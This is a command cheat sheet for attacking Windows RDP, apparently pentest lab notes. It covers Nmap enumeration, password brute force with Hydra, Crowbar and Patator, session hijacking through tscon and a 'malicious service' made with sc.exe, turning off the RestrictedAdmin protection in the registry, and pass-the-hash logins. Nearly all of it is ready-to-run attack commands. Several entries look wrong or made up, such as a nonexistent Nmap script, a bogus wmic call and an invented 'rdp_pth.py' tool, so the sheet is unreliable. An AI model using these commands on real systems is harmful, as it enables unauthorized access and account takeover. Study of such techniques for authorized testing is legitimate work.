# RDP Enumeration and Exploitation Technique

---

# 1. Nmap

```bash
# Basic RDP scan
nmap -p3389 --script rdp* 10.129.203.12

# Detailed RDP info
nmap -p3389 -sV --script rdp-enum-encryption,rdp-ntlm-info,rdp-security,nmap-rdp,rdp-vuln-ms12-006 10.129.203.12

# NLA check + creds test
nmap -p3389 --script rdp-ntlm-info --script-args rdp-ntlm-info.timeout=30s 10.129.203.12

rdp-enum-encryption: RDP encryption levels
rdp-ntlm-info: NLA enabled? NTLMv1/2 support
rdp-security: CredSSP/NLA detection
nmap-rdp: Protocol version
```

# 2. Authentication

```bash
# xfreerdp (Linux → Windows)
xfreerdp /u:Administrator /p:Pass123 /v:10.129.203.12

# rdesktop
rdesktop -u Administrator -p Pass123 10.129.203.12

# Windows RDP
mstsc /v:10.129.203.12 /u:Administrator /p:Pass123

# No NLA bypass
xfreerdp /u:user /p:pass /v:target -cert-ignore -sec-nla
```

# 3. Brute Force

```bash
# Hydra
hydra -L users.txt -P rockyou.txt rdp://10.129.203.12

# Crowbar (RDP-specific)
crowbar -b rdp -s 10.129.203.12/32 -u administrator -C rockyou.txt

# Patator
patator rdp_login host=10.129.203.12 user=FILE0 0=users.txt password=FILE1 1=pass.txt
```

# 4. Session Hijacking

```bash
# Native Windows commands
query user                  # Most reliable - shows session ID, user, state
qwinsta                     # Quick session list with IDs
qwinsta /server:.           # Current machine

# WMIC for remote enumeration
wmic /node:TARGET rdtoggle where LogonId='2' call SetSessionStatus,Active
wmic /node:TARGET path win32_logonsession get LogonId,LogonType,StartTime /format:table

# PowerShell (detailed)
Get-WmiObject Win32_LoggedOnUser | Select Antecedent,Dependent | FL
quser.exe | ConvertFrom-String

# CrackMapExec (fastest/most reliable)
crackmapexec rdp TARGET -u admin -p pass --sessions
cme smb TARGET -u admin -p pass --sessions

# WMIEExec.py (Impacket)
wmiexec.py admin:pass@TARGET "qwinsta && query user"

# PsExec
psexec.py -u admin -p pass TARGET "qwinsta && query user"

# PowerShell remoting
Invoke-Command -ComputerName TARGET -Credential admin:pass -ScriptBlock { qwinsta }


qwinsta output analysis:
SESSIONNAME    USERNAME       ID  STATE
console        administrator  1   Active    ← Physical console
rdp-tcp#13     user123        2   Active    ← RDP Session (target!)
                  services     0   Disc      ← SYSTEM session (ignore)


# Local (from compromised session)
tscon 2 /dest:console       # Session ID 2 → console
tscon 2 /dest:rdp-tcp#13    # Session 2 → new RDP (requires 2nd RDP)

# Remote via Impacket
wmiexec.py admin:pass@TARGET "qwinsta && tscon 2 /dest:console"
psexec.py admin:pass@TARGET "tscon 2 /dest:console"

# CrackMapExec (one-liner)
cme smb TARGET -u admin -p pass -x "tscon 2 /dest:console"


# Create malicious service (wmiexec)
wmiexec.py admin:pass@TARGET 'sc.exe create RDPHijack binpath= "cmd.exe /c tscon 2 /dest:console"'

# Alternative payloads
sc.exe create sessionhijack binpath= "powershell.exe -c \"tscon 2 /dest:console\""
sc.exe create sessionhijack binpath= "cmd.exe /k qwinsta & tscon 2 /dest:console"

```

# 5. RDP Pass The Hash

```bash

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
Name: DisableRestrictedAdmin
Type: REG_DWORD  
Value: 0  (default=1 → PTH blok)
Bu key 1 olarsa → RDP NTLM hash qəbul etmir (NLA/CredSSP blok).

# DisableRestrictedAdmin
wmiexec.py htldbuser:MSSQLAccess01!@10.129.203.12 "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin

# NTLM hash format: admin::domain:LMHASH:NTHASH::: 
xfreerdp /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7587C /v:10.129.203.12

# Full PTH
xfreerdp /u:Administrator /d:WIN-02 /h:8846F7EAEE8FB117AD06BDD830B7587C /v:10.129.203.12 /cert-ignore

# impacket-extras
python3 rdp_pth.py WIN-02/Administrator@10.129.203.12 -hashes :8846F7EAEE8FB117AD06BDD830B7587C

# Ya psexec üçün
psexec.py WIN-02/Administrator@10.129.203.12 -hashes :8846F7EAEE8FB117AD06BDD830B7587C

msfconsole
use auxiliary/scanner/rdp/rdp_login
set RHOSTS 10.129.203.12
set USERNAME Administrator
set RPORT 3389
set PTH_HASH 8846F7EAEE8FB117AD06BDD830B7587C
run
```
